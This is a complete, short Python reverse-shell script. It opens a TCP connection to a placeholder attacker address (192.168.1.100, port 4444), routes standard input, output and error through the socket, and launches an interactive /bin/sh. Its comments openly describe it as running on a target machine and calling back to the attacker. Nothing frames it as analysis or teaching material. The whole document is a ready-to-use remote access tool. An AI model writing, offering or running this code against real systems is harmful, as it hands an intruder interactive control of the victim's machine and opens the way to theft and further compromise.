import socket
import subprocess
import os

# Define the attacker's IP address and the port to connect back to.
ATTACKER_IP = "192.168.1.100"  # Replace with your attacker machine's IP address
ATTACKER_PORT = 4444  # Choose any open port on the attacker machine

# Create a socket object for network communication
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker machine
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirect the standard input, output, and error to the socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Spawn a shell on the target machine
subprocess.call(["/bin/sh", "-i"])
